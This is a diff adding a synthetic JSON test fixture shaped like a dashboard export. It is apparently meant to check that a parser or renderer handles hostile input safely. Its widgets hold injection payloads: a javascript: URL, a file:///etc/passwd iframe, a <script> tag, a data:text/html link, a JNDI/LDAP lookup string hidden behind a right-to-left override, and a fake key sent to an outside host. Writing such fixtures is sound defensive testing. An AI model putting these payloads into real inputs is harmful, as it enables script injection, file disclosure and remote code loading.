@@ -1,0 +1,48 @@
+{
+ "_synthetic": "SYNTHETIC: hand-written hostile test case, not a Datadog export (dashboard_urls_and_html)",
+ "title": "SYNTHETIC urls and html",
+ "layout_type": "free",
+ "template_variables": [],
+ "widgets": [
+  {
+   "definition": {
+    "type": "image",
+    "url": "javascript:alert(1)"
+   }
+  },
+  {
+   "definition": {
+    "type": "iframe",
+    "url": "file:///etc/passwd"
+   }
+  },
+  {
+   "definition": {
+    "type": "note",
+    "content": "<script>alert(1)</script> | a | b |\n[x](data:text/html;base64,AAAA) SYNTHETIC-FAKE-NOT-A-SECRET-token"
+   }
+  },
+  {
+   "definition": {
+    "type": "free_text",
+    "text": "\u202e${jndi:ldap://x.invalid}"
+   }
+  },
+  {
+   "definition": {
+    "type": "timeseries",
+    "custom_links": [
+     {
+      "label": "l",
+      "link": "https://x.invalid/?k=SYNTHETIC-FAKE-NOT-A-SECRET-key&h={{host.name}}"
+     }
+    ],
+    "requests": [
+     {
+      "q": "avg:x{*}"
+     }
+    ]
+   }
+  }
+ ]
+}
